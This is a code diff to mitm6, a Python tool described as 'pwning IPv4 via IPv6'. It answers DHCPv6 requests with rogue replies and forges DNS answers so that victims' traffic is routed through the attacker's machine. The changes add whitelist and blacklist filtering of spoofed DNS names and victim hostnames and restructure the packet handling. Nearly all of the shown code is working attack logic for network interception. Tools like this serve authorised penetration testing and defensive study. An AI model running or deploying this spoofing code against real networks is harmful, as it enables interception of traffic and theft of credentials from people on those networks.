@@ -61,11 +61,24 @@ class Config(object):
         self.selfptr = ipaddress.ip_address(str(self.selfaddr)).reverse_pointer + '.'
         self.ipv6noaddr = random.randint(1,9999)
         self.ipv6noaddrc = 1
-        self.dnsdomain=[]
-        for d in args.domain:
-            self.dnsdomain.append(d.lower())
+        # DNS whitelist / blacklist options
+        self.dns_whitelist = [d.lower() for d in args.domain]
+        self.dns_blacklist = [d.lower() for d in args.blacklist]
+        # Hostname (DHCPv6 FQDN) whitelist / blacklist options
+        self.host_whitelist = [d.lower() for d in args.host_whitelist]
+        self.host_blacklist = [d.lower() for d in args.host_blacklist]
+        # Should DHCPv6 queries that do not specify a FQDN be ignored?
+        self.ignore_nofqnd = args.ignore_nofqnd
+        # Local domain to advertise
+        # If no localdomain is specified, use the first dnsdomain
+        if args.localdomain is None:
+            try:
+                self.localdomain = args.domain[0]
+            except IndexError:
+                self.localdomain = None
+        else:
+            self.localdomain = args.localdomain.lower()
 
-        self.localdomain = args.localdomain.lower()
         self.debug = args.debug
         self.verbose = args.verbose
         self.invertdns = args.invertdns
@@ -110,7 +123,8 @@ def send_dhcp_advertise(p, basep, target):
     resp /= DHCP6OptClientId(duid=p[DHCP6OptClientId].duid)
     resp /= DHCP6OptServerId(duid=config.selfduid)
     resp /= DHCP6OptDNSServers(dnsservers=[config.selfaddr])
-    resp /= DHCP6OptDNSDomains(dnsdomains=[config.localdomain])
+    if config.localdomain:
+        resp /= DHCP6OptDNSDomains(dnsdomains=[config.localdomain])
     if target.ipv4 != '':
         addr = config.ipv6prefix + target.ipv4.replace('.', ':')
     else:
@@ -127,7 +141,8 @@ def send_dhcp_reply(p, basep):
     resp /= DHCP6OptClientId(duid=p[DHCP6OptClientId].duid)
     resp /= DHCP6OptServerId(duid=config.selfduid)
     resp /= DHCP6OptDNSServers(dnsservers=[config.selfaddr])
-    resp /= DHCP6OptDNSDomains(dnsdomains=[config.localdomain])
+    if config.localdomain:
+        resp /= DHCP6OptDNSDomains(dnsdomains=[config.localdomain])
     opt = p[DHCP6OptIAAddress]
     resp /= DHCP6OptIA_NA(ianaopts=[opt], T1=200, T2=250, iaid=p[DHCP6OptIA_NA].iaid)
     sendp(resp, verbose=False)
@@ -164,7 +179,7 @@ def send_dns_reply(p):
     #Not handled
     else:
         return
-    if should_spoof(reqname):
+    if should_spoof_dns(reqname):
         resp /= DNS(id=dns.id, qr=1, qd=dns.qd, an=DNSRR(rrname=dns.qd.qname, ttl=100, rdata=rdata, type=dns.qd.qtype))
         try:
             sendp(resp, verbose=False)
@@ -178,41 +193,69 @@ def send_dns_reply(p):
         if config.verbose or config.debug:
             print('Ignored query for %s from %s' % (reqname, ip.src))
 
-def should_spoof(dnsname):
-    # dnsdomain NOT empty and NOT invert == intercept all but dnsdomain
-    if config.dnsdomain and not config.invertdns:
-        if dnsname.lower() in config.dnsdomain:
+# Helper function to check whether any element in the list "matches" value
+def matches_list(value, target_list):
+    testvalue = value.lower()
+    for test in target_list:
+        if test in testvalue:
             return True
-    # dnsdomain NOT empty and invert == intercept just dnsdomain
-    elif config.dnsdomain and config.invertdns:
-        if dnsname.lower() not in config.dnsdomain:
-            return True
-    # dnsdomain empty and NOT invert == do intercept everything, prolly brokes things
-    elif config.dnsdomain and not config.invertdns:
-        return True
-    # dnsdomain empty and invert == do not intercept anything, should never happen
-    elif config.dnsdomain and config.invertdns:
-        return False
-    else:
-        return False
     return False
 
-def parsepacket(p, config):
+# Should we spoof the queried name?
+def should_spoof_dns(dnsname):
+    # If whitelist exists, host should match
+    if config.dns_whitelist and not matches_list(dnsname, config.dns_whitelist):
+        return False
+    # If there are any entries in the blacklist, make sure it doesnt match against any
+    if matches_list(dnsname, config.dns_blacklist):
+        return False
+    return True
+
+# Should we reply to this host?
+def should_spoof_dhcpv6(fqdn):
+    # If there is no FQDN specified, check if we should reply to empty ones
+    if not fqdn:
+        return not config.ignore_nofqnd
+    # If whitelist exists, host should match
+    if config.host_whitelist and not matches_list(fqdn, config.host_whitelist):
+        if config.debug:
+            print('Ignoring DHCPv6 packet from %s: FQDN not in whitelist ' % fqdn)
+        return False
+    # If there are any entries in the blacklist, make sure it doesnt match against any
+    if matches_list(fqdn, config.host_blacklist):
+        if config.debug:
+            print('Ignoring DHCPv6 packet from %s: FQDN matches blacklist ' % fqdn)
+        return False
+    return True
+
+# Get a target object if it exists, otherwise, create it
+def get_target(p):
+    mac = p.src
+    # If it exists, return it
+    try:
+        return pcdict[mac]
+    except KeyError:
+        try:
+            fqdn = get_fqdn(p)
+        except IndexError:
+            fqdn = ''
+        pcdict[mac] = Target(mac,fqdn)
+        return pcdict[mac]
+
+# Parse a packet
+def parsepacket(p):
     if DHCP6_Solicit in p:
-        mac = p.src
-        if mac not in pcdict.keys():
-            try:
-                fqdn = get_fqdn(p)
-            except IndexError:
-                fqdn = ''
-            pcdict[mac] = Target(mac,fqdn)
-        send_dhcp_advertise(p[DHCP6_Solicit], p, pcdict[mac])
+        target = get_target(p)
+        if should_spoof_dhcpv6(target.host):
+            send_dhcp_advertise(p[DHCP6_Solicit], p, target)
     if DHCP6_Request in p:
-        if p[DHCP6OptServerId].duid == config.selfduid:
+        target = get_target(p)
+        if p[DHCP6OptServerId].duid == config.selfduid and should_spoof_dhcpv6(target.host):
             send_dhcp_reply(p[DHCP6_Request], p)
             print('IPv6 address %s is now assigned to %s' % (p[DHCP6OptIA_NA].ianaopts[0].addr, pcdict[p.src]))
     if DHCP6_Renew in p:
-        if p[DHCP6OptServerId].duid == config.selfduid:
+        target = get_target(p)
+        if p[DHCP6OptServerId].duid == config.selfduid and should_spoof_dhcpv6(target.host):
             send_dhcp_reply(p[DHCP6_Renew],p)
             print('Renew reply sent to %s' % p[DHCP6OptIA_NA].ianaopts[0].addr)
     if ARP in p:
@@ -256,10 +299,9 @@ def print_err(failure):
 
 def main():
     global config
-    parser = argparse.ArgumentParser(description='mitm6 - pwning IPv4 via IPv6')
-    parser.add_argument("-d", "--domain", action='append', metavar='DOMAIN', help="Domain name to filter DNS queries on (Whitelist principle, multiple can be specified.)")
-    parser.add_argument("-l", "--localdomain", type=str, metavar='LOCALDOMAIN', help="Domain name to use as DNS search domain")
+    parser = argparse.ArgumentParser(description='mitm6 - pwning IPv4 via IPv6\nFor help or reporting issues, visit https://github.com/fox-it/mitm6', formatter_class=argparse.RawDescriptionHelpFormatter)
     parser.add_argument("-i", "--interface", type=str, metavar='INTERFACE', help="Interface to use (default: autodetect)")
+    parser.add_argument("-l", "--localdomain", type=str, metavar='LOCALDOMAIN', help="Domain name to use as DNS search domain (default: use first DNS domain)")
     parser.add_argument("-4", "--ipv4", type=str, metavar='ADDRESS', help="IPv4 address to send packets from (default: autodetect)")
     parser.add_argument("-6", "--ipv6", type=str, metavar='ADDRESS', help="IPv6 link-local address to send packets from (default: autodetect)")
     parser.add_argument("-m", "--mac", type=str, metavar='ADDRESS', help="Custom mac address - probably breaks stuff (default: mac of selected interface)")
@@ -268,29 +310,38 @@ def main():
     parser.add_argument("-v", "--verbose", action='store_true', help="Show verbose information")
     parser.add_argument("--debug", action='store_true', help="Show debug information")
 
+    filtergroup = parser.add_argument_group("Filtering options")
+    filtergroup.add_argument("-d", "--domain", action='append', default=[], metavar='DOMAIN', help="Domain name to filter DNS queries on (Whitelist principle, multiple can be specified.)")
+    filtergroup.add_argument("-b", "--blacklist", action='append', default=[], metavar='DOMAIN', help="Domain name to filter DNS queries on (Blacklist principle, multiple can be specified.)")
+    filtergroup.add_argument("-hw", "--host-whitelist", action='append', default=[], metavar='DOMAIN', help="Hostname (FQDN) to filter DHCPv6 queries on (Whitelist principle, multiple can be specified.)")
+    filtergroup.add_argument("-hb", "--host-blacklist", action='append', default=[], metavar='DOMAIN', help="Hostname (FQDN) to filter DHCPv6 queries on (Blacklist principle, multiple can be specified.)")
+    filtergroup.add_argument("--ignore-nofqnd", action='store_true', help="Ignore DHCPv6 queries that do not contain the Fully Qualified Domain Name (FQDN) option.")
+
     args = parser.parse_args()
     config = Config(args)
+
     print('Starting mitm6 using the following configuration:')
     print('Primary adapter: %s [%s]' % (config.default_if, config.selfmac))
     print('IPv4 address: %s' % config.selfipv4)
     print('IPv6 address: %s' % config.selfaddr)
-    if len(config.dnsdomain)<1:
-        if not args.invertdns:
-            print('Warning: Not filtering on any domain, mitm6 will reply to all DNS queries.\nUnless this is what you want, specify a domain with -d')
-        else:
-            print('Warning: Filtering on any domain, mitm6 will not reply to any DNS queries.\nUnless this is what you want, specify a domain with -d')
-        config.dnsdomain = []
+    if config.localdomain is not None:
+        print('DNS local search domain: %s' % config.localdomain)
+    if not config.dns_whitelist and not config.dns_blacklist:
+        print('Warning: Not filtering on any domain, mitm6 will reply to all DNS queries.\nUnless this is what you want, specify at least one domain with -d')
     else:
-        if args.invertdns:
-            print('Ignoring ',end="")
+        if not config.dns_whitelist:
+            print('DNS whitelist: *')
         else:
-            print('Replying to',end="")
-        print(' DNS domains:')
-        print(config.dnsdomain)
-
+            print('DNS whitelist: %s' % ', '.join(config.dns_whitelist))
+        if config.dns_blacklist:
+            print('DNS blacklist: %s' % ', '.join(config.dns_blacklist))
+    if config.host_whitelist:
+        print('Hostname whitelist: %s' % ', '.join(config.host_whitelist))
+    if config.host_blacklist:
+        print('Hostname blacklist: %s' % ', '.join(config.host_blacklist))
 
     #Main packet capture thread
-    d = threads.deferToThread(sniff, filter="ip6 proto \\udp or arp or udp port 53", prn=lambda x: reactor.callFromThread(parsepacket, x, config), stop_filter=should_stop)
+    d = threads.deferToThread(sniff, filter="ip6 proto \\udp or arp or udp port 53", prn=lambda x: reactor.callFromThread(parsepacket, x), stop_filter=should_stop)
     d.addErrback(print_err)
 
     #RA loop
